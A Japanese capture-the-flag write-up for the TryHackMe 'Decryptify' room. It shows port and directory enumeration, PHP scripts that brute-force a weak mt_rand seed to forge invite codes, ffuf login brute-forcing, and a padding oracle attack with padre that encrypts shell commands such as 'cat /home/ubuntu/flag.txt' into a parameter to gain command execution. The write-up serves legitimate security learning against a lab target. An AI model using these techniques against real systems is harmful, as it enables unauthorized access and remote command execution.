# Decryptify CTF

https://tryhackme.com/room/decryptify

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.100.69
root@ip-10-10-132-142:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-18 05:49 BST
Nmap scan report for 10.10.100.69
Host is up (0.00011s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 02:A9:67:7C:F4:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
root@ip-10-10-132-142:~# sudo nmap -sV -p22,1337 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-18 05:49 BST
Nmap scan report for 10.10.100.69
Host is up (0.00010s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:A9:67:7C:F4:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.32 seconds
```

SSH と、1337 に HTTP

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://decryptify.thm:1337 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 281]
/api.php              (Status: 200) [Size: 1043]
/css                  (Status: 301) [Size: 321] [--> http://decryptify.thm:1337/css/]
/dashboard.php        (Status: 302) [Size: 0] [--> logout.php]
/footer.php           (Status: 200) [Size: 245]
/header.php           (Status: 200) [Size: 370]
/.htaccess            (Status: 403) [Size: 281]
/.htaccess.php        (Status: 403) [Size: 281]
/.htaccess.txt        (Status: 403) [Size: 281]
/.htpasswd.txt        (Status: 403) [Size: 281]
/.htpasswd.php        (Status: 403) [Size: 281]
/.htpasswd            (Status: 403) [Size: 281]
/index.php            (Status: 200) [Size: 3220]
/javascript           (Status: 301) [Size: 328] [--> http://decryptify.thm:1337/javascript/]
/js                   (Status: 301) [Size: 320] [--> http://decryptify.thm:1337/js/]
/logs                 (Status: 301) [Size: 322] [--> http://decryptify.thm:1337/logs/]
/phpmyadmin           (Status: 301) [Size: 328] [--> http://decryptify.thm:1337/phpmyadmin/]
/server-status        (Status: 403) [Size: 281]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

## Web 画面

- ログイン画面、API ドキュメンテーション画面がある。
- ログインは（ユーザー名、パスワード）と（E メールアドレス、招待コード）の 2 種類
- API ドキュメンテーション画面はパスワード入力が必要

ログイン画面でロードされている javascript を調査する。

### /js/api.js

```js
function b(c, d) {
  const e = a();
  return (
    (b = function (f, g) {
      f = f - 0x165;
      let h = e[f];
      return h;
    }),
    b(c, d)
  );
}
const j = b;

function a() {
  const k = [
    "16OTYqOr",
    "861cPVRNJ",
    "474AnPRwy",
    "H7gY2tJ9wQzD4rS1",
    "5228dijopu",
    "29131EDUYqd",
    "8756315tjjUKB",
    "1232020YOKSiQ",
    "7042671GTNtXE",
    "1593688UqvBWv",
    "90209ggCpyY",
  ];
  a = function () {
    return k;
  };
  return a();
}
(function (d, e) {
  const i = b,
    f = d();
  while (!![]) {
    try {
      const g =
        parseInt(i(0x16b)) / 0x1 +
        -parseInt(i(0x16f)) / 0x2 +
        (parseInt(i(0x167)) / 0x3) * (parseInt(i(0x16a)) / 0x4) +
        parseInt(i(0x16c)) / 0x5 +
        (parseInt(i(0x168)) / 0x6) * (parseInt(i(0x165)) / 0x7) +
        (-parseInt(i(0x166)) / 0x8) * (parseInt(i(0x16e)) / 0x9) +
        parseInt(i(0x16d)) / 0xa;
      if (g === e) break;
      else f["push"](f["shift"]());
    } catch (h) {
      f["push"](f["shift"]());
    }
  }
})(a, 0xe43f0);
const c = j(0x169);
```

結局のところ、`c='H7gY2tJ9wQzD4rS1'` という結果しか残らない。

これを API 画面のパスワードとして入力したら、認証された。

### Token Generation

```php
This function generates a invite_code against a user email.


// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
     $seed_value = calculate_seed_value($email, $constant_value);
     mt_srand($seed_value);
     $random = mt_rand();
     $invite_code = base64_encode($random);
```

- 招待コードの生成方法
- E メールアドレスと定数値を使って生成したシードから乱数を生成し、乱数値を Base64 エンコードしたものを招待コードとしている。
- E メールアドレス固定、定数値総当たりで招待コードのリストを作れば、招待コードによるログインブルートフォースが可能と考えられる。

### General Information

```php
This section provides general information about the API.

// General API Information
API Name: Decryptify API
Version: 1.0
```

## ログイン

メールアドレスを`thm@thm.com`固定、定数値を 100 万までの範囲で招待コードを生成する。

```php
<?php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$email = "thm@thm.com";

for ($i = 0; $i < 1000000; $i++) {
    $constant_value = $i;
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    $invite_code = base64_encode($random);
    print("$invite_code\n");
}
?>
```

```shell
$ php ./gen_code.php > ./code_list.txt

$ head ./code_list.txt
NjMyNzg4Mjc5
MTM5NjY2ODA1Mw==
MjA5NDUxODIy
MTI2MzAwMTI2NQ==
MTA0NjM1ODc2
NDQ3NjY1NTk0
MTExMDg4ODc0NQ==
MjA2MTYyMTQ1Nw==
MTg2ODU3NzM0Ng==
MTg0NDQ1MDY2Nw==
```

ブルートフォースを実行したが、ヒットしない。

```shell
ffuf -u http://decryptify.thm:1337/ -c -w ./code_list.txt -X POST -d 'invite_username=thm@thm.com&invite_code=FUZZ' -fr 'does not exist' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=kq91m1g7hqr69m1jpr3fcb3kfm'
```

Gobuster で、/logs ディレクトリが出ていた。ログを見る。

/logs/app.log

```
2025-01-23 14:32:56 - User POST to /index.php (Login attempt)
2025-01-23 14:33:01 - User POST to /index.php (Login attempt)
2025-01-23 14:33:05 - User GET /index.php (Login page access)
2025-01-23 14:33:15 - User POST to /index.php (Login attempt)
2025-01-23 14:34:20 - User POST to /index.php (Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
2025-01-23 14:35:25 - User GET /index.php (Login page access)
2025-01-23 14:36:30 - User POST to /dashboard.php (User alpha@fake.thm deactivated)
2025-01-23 14:37:35 - User GET /login.php (Page not found)
2025-01-23 14:38:40 - User POST to /dashboard.php (New user created: hello@fake.thm)
```

- alpha@fake.thm を招待したときのコードは`MTM0ODMzNzEyMg==`
- alpha@fake.thm は無効化されている
- hello@fake.thm ユーザーが作られている

したがって、まず定数値を特定し、それを使って hello ユーザーの招待コードを得ればよい。

### 定数値の特定

```php
<?php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$email = "alpha@fake.thm";

for ($i = 0; $i < 1000000; $i++) {
    $constant_value = $i;
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    $invite_code = base64_encode($random);

    if ($invite_code === "MTM0ODMzNzEyMg==") {
        print("constant found! $constant_value\n");
        break;
    }
}
?>
```

```shell
$ php ./find_const.php
constant found! 99999
```

定数値は、99999 と判明。

### 招待コードの生成

```php
<?php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$email = "hello@fake.thm";

$constant_value = 99999;
$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);

print("invite code: $invite_code\n")
?>
```

```shell
$ php ./gen_invite.php
invite code: （ひみつ）
```

これを使ってログイン成功。フラグ１ゲット。

## 権限昇格

管理者権限を持った`admin@fake.thm`ユーザーがいることが分かった。

定数値 99999 を使って招待コードを生成したが、ログインできなかった。

100 万の範囲で定数値ブルートフォースをかけたが、ヒットしなかった。

```php
<?php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}

$email = "admin@fake.thm";

for ($i = 0; $i < 1000000; $i++) {
    $constant_value = $i;
    $seed_value = calculate_seed_value($email, $constant_value);
    mt_srand($seed_value);
    $random = mt_rand();
    $invite_code = base64_encode($random);
    print("$invite_code\n");
}
?>
```

```shell
root@ip-10-10-132-142:~# ffuf -u http://decryptify.thm:1337/ -c -w ./code_list.txt -X POST -d 'invite_username=admin@fake.thm&invite_code=FUZZ' -fr 'Invalid' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=kq91m1g7hqr69m1jpr3fcb3kfm'
```

Cookie に role があるのが気になる。長さから SHA384 ハッシュと思われる。  
これを操作して、ロールを admin に偽装できないかと考えたが、分からなかった。

```
PHPSESSID: （PHPセッションID）
role: （ロールクッキー）
```

ダッシュボードのソースに下記の項目があるのが気になった。

```html
<form method="get">
  <input type="hidden" name="date" value="dIfB[REDACTED]=" />
</form>
```

一件 Base64 のようだが、正常にデコードできない。 dashboard.php?date=xxxxx
のように適当に入れて GET すると、フッター部分でパディングエラーが発生する。しかし、これが何かに使えるようには思えない。

`Warning: openssl_decrypt(): IV passed is only 4 bytes long, cipher expects an
IV of precisely 8 bytes, padding with \0 in /var/www/html/dashboard.php on line
28`

ここでギブアップ。

### パディングオラクル

https://github.com/glebarez/padre

Base64値もどきを復号化

```shell
$ padre -cookie 'PHPSESSID=（PHPセッションID）; role=（ロールクッキー）' -u 'http://decryptify.thm:1337/dashboard.php?date=$' 'dIfB[REDACTED]='
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: decrypt
[1/1] date +%Y\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08\x08        [24/24] | reqs: 3695 (50/sec)
```

id コマンドを暗号化

```shell
$ padre -cookie 'PHPSESSID=（PHPセッションID）; role=（ロールクッキー）' -u 'http://decryptify.thm:1337/dashboard.php?date=$' -enc 'id'
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: encrypt
[1/1] o7[REDACTED]aQ==
```

これを date パラメータとしてブラウザで GET すると、フッター部分にコマンドの出力が表示される。

```
© uid=33(www-data) gid=33(www-data) groups=33(www-data) Decryptify
```

最終目的の、フラグを読むコマンド

```shell
$ padre -cookie 'PHPSESSID=（PHPセッションID）; role=（ロールクッキー）' -u 'http://decryptify.thm:1337/dashboard.php?date=$' -enc 'cat /home/ubuntu/flag.txt'
[i] padre is on duty
[i] using concurrency (http connections): 30
[+] successfully detected padding oracle
[+] detected block length: 8
[!] mode: encrypt
[1/1] kl[REDACTED]cg==
```

```
© THM{.......................} Decryptify
```

## 振り返り

- gobuster で /logs ディレクトリが出ていたのに、後まで調べていなかったので無駄に苦労した。
- パディングオラクルは今回初めて知った。重要な学び。
- 知らないとどうしようもないタイプの CTF。パディングエラーが表示されることろまでは自力で気付けていたのは良かった点。
- パディングオラクルのルームがあるが、まだ 3 カ月経っていない。その 2 週間後にこの CTF が公開されたという経緯。

https://tryhackme.com/room/paddingoracles
